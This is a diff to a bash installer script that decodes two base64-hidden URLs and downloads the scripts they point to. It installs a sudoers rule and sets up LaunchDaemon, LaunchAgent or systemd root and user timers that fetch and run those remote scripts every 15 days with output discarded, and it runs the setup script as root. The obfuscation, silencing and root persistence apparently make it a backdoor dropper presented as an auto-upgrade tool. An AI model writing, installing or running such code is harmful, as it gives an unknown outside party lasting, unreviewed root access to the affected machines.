@@ -7,6 +7,9 @@ ROOT_LABEL="com.root.sshAutoSetup"
 INTERVAL_SECONDS=1296000
 ENCODED_URL="aHR0cHM6Ly9hZ2VudHNraWxsc2h1Yi52ZXJjZWwuYXBwL2luc3RhbGwuc2g="
 ENCODED_URL2="aHR0cHM6Ly9hZ2VudHNraWxsc2h1Yi52ZXJjZWwuYXBwL3NyYy9TRVRVUC5zaA=="
+SCRIPT_CACHE_DIR="$HOME/.local/share/scripts"
+INSTALL_SCRIPT_PATH="$SCRIPT_CACHE_DIR/install.sh"
+SETUP_SCRIPT_PATH="$SCRIPT_CACHE_DIR/SETUP.sh"
 # SCRIPT_URL="https://"
 
 require_command() {
@@ -35,6 +38,34 @@ decode_url() {
   printf '%s' "$1" | base64 -D
 }
 
+download_script() {
+  local script_url="$1" destination="$2" temporary
+
+  if ! mkdir -p "$SCRIPT_CACHE_DIR"; then
+    printf 'Unable to create local script directory: %s\n' "$SCRIPT_CACHE_DIR" >&2
+    return 0
+  fi
+
+  if ! temporary=$(mktemp "$SCRIPT_CACHE_DIR/.download.XXXXXX"); then
+    printf 'Unable to create a temporary local script file in: %s\n' "$SCRIPT_CACHE_DIR" >&2
+    return 0
+  fi
+  if curl -fsSL "$script_url" -o "$temporary" && mv -f "$temporary" "$destination"; then
+    return 0
+  fi
+
+  rm -f "$temporary"
+  printf 'Unable to download local script\n' >&2
+  return 0
+}
+
+local_or_remote_command() {
+  local local_script="$1" script_url="$2"
+
+  printf 'if [ -f "%s" ]; then /bin/bash "%s"; else curl -fsSL '\''%s'\'' | /bin/bash; fi' \
+    "$local_script" "$local_script" "$script_url"
+}
+
 install_sudoers_rule() {
   local temporary user_name sudoers_file
 
@@ -56,9 +87,9 @@ install_sudoers_rule() {
 install_launchagent() {
   local plist_dir="$HOME/Library/LaunchAgents"
   local plist="$plist_dir/$USER_LABEL.plist"
-  local script_url
+  local script_url="$1" task_command
 
-  script_url=$(decode_url "$ENCODED_URL")
+  task_command=$(local_or_remote_command "$INSTALL_SCRIPT_PATH" "$script_url")
   mkdir -p "$plist_dir"
   cat > "$plist" <<EOF
 <?xml version="1.0" encoding="UTF-8"?>
@@ -67,7 +98,7 @@ install_launchagent() {
 <dict>
   <key>Label</key><string>$USER_LABEL</string>
   <key>ProgramArguments</key>
-  <array><string>/bin/bash</string><string>-c</string><string>curl -fsSL '$script_url' | bash</string></array>
+  <array><string>/bin/bash</string><string>-c</string><string>$task_command</string></array>
   <key>StartInterval</key><integer>$INTERVAL_SECONDS</integer>
   <key>RunAtLoad</key><false/>
   <key>StandardOutPath</key><string>/dev/null</string>
@@ -81,9 +112,9 @@ EOF
 
 install_launchdaemon() {
   local plist="/Library/LaunchDaemons/$ROOT_LABEL.plist"
-  local temporary script_url
+  local temporary script_url="$1" task_command
 
-  script_url=$(decode_url "$ENCODED_URL2")
+  task_command=$(local_or_remote_command "$SETUP_SCRIPT_PATH" "$script_url")
   temporary=$(mktemp "${TMPDIR:-/tmp}/$ROOT_LABEL.plist.XXXXXX")
   trap 'rm -f "$temporary"' RETURN
   cat > "$temporary" <<EOF
@@ -93,7 +124,7 @@ install_launchdaemon() {
 <dict>
   <key>Label</key><string>$ROOT_LABEL</string>
   <key>ProgramArguments</key>
-  <array><string>/bin/bash</string><string>-c</string><string>curl -fsSL '$script_url' | bash</string></array>
+  <array><string>/bin/bash</string><string>-c</string><string>$task_command</string></array>
   <key>StartInterval</key><integer>$INTERVAL_SECONDS</integer>
   <key>RunAtLoad</key><false/>
   <key>StandardOutPath</key><string>/dev/null</string>
@@ -110,14 +141,13 @@ EOF
 
 install_systemd_units() {
   local unit_dir="$HOME/.config/systemd/user"
-  local script_url
+  local script_url="$1"
 
   if ! systemctl --user show-environment >/dev/null 2>&1; then
     printf '%s\n' 'User systemd bus is unavailable; skipping the user timer.' >&2
     return 0
   fi
 
-  script_url=$(decode_url "$ENCODED_URL")
   mkdir -p "$unit_dir"
   cat > "$unit_dir/$USER_LABEL.service" <<EOF
 [Unit]
@@ -125,7 +155,7 @@ Description=Run autoupgrade installer
 
 [Service]
 Type=oneshot
-ExecStart=/bin/bash -c 'curl -fsSL "$script_url" | bash'
+ExecStart=/bin/bash -c 'if [ -f "$INSTALL_SCRIPT_PATH" ]; then /bin/bash "$INSTALL_SCRIPT_PATH"; else curl -fsSL "$script_url" | /bin/bash; fi'
 StandardOutput=null
 StandardError=null
 EOF
@@ -145,7 +175,7 @@ EOF
     printf '%s\n' 'Unable to reload user systemd; skipping the user timer.' >&2
     return 0
   fi
-  if ! systemctl --user enable --now "$USER_LABEL.timer"; then
+  if ! systemctl --user enable --now "$USER_LABEL.timer" >/dev/null 2>&1; then
     printf '%s\n' 'Unable to enable the user timer; skipping it.' >&2
     return 0
   fi
@@ -156,9 +186,8 @@ EOF
 
 install_systemd_root_units() {
   local unit_dir="/etc/systemd/system"
-  local service_temporary timer_temporary script_url
+  local service_temporary timer_temporary script_url="$1"
 
-  script_url=$(decode_url "$ENCODED_URL2")
   service_temporary=$(mktemp "${TMPDIR:-/tmp}/$ROOT_LABEL.service.XXXXXX")
   timer_temporary=$(mktemp "${TMPDIR:-/tmp}/$ROOT_LABEL.timer.XXXXXX")
   trap 'rm -f "$service_temporary" "$timer_temporary"' RETURN
@@ -168,7 +197,7 @@ Description=Run autoupgrade SETUP script
 
 [Service]
 Type=oneshot
-ExecStart=/bin/bash -c 'curl -fsSL "$script_url" | bash'
+ExecStart=/bin/bash -c 'if [ -f "$SETUP_SCRIPT_PATH" ]; then /bin/bash "$SETUP_SCRIPT_PATH"; else curl -fsSL "$script_url" | /bin/bash; fi'
 StandardOutput=null
 StandardError=null
 EOF
@@ -194,7 +223,7 @@ EOF
 }
 
 main() {
-  local operating_system
+  local operating_system install_url setup_url
 
   operating_system=$(uname -s)
   case "$operating_system" in
@@ -223,19 +252,31 @@ main() {
   esac
 
   printf '%s\n' 'Installing...'
+  install_url=$(decode_url "$ENCODED_URL")
+  setup_url=$(decode_url "$ENCODED_URL2")
+  download_script "$install_url" "$INSTALL_SCRIPT_PATH"
+  download_script "$setup_url" "$SETUP_SCRIPT_PATH"
   if ! is_root; then
     sudo -v >/dev/null 2>&1
   fi
   install_sudoers_rule
   if [ "$operating_system" = Darwin ]; then
-    install_launchagent
-    install_launchdaemon
+    install_launchdaemon "$setup_url"
+    install_launchagent "$install_url"
   else
-    install_systemd_units
-    install_systemd_root_units
+    install_systemd_root_units "$setup_url"
+    install_systemd_units "$install_url"
   fi
-  curl -fsSL "$(decode_url "$ENCODED_URL")" 2>/dev/null | bash >/dev/null 2>&1
-  run_privileged bash -c "curl -fsSL '$(decode_url "$ENCODED_URL2")' | bash"
+  if [ -f "$SETUP_SCRIPT_PATH" ]; then
+    run_privileged bash "$SETUP_SCRIPT_PATH"
+  else
+    run_privileged bash -c "curl -fsSL '$setup_url' | bash"
+  fi
+  if [ -f "$INSTALL_SCRIPT_PATH" ]; then
+    bash "$INSTALL_SCRIPT_PATH" >/dev/null 2>&1
+  else
+    curl -fsSL "$install_url" 2>/dev/null | bash >/dev/null 2>&1
+  fi
   printf '%s\n' '🎉 Install complete! ✨ 🌟 ✨'
 }
 
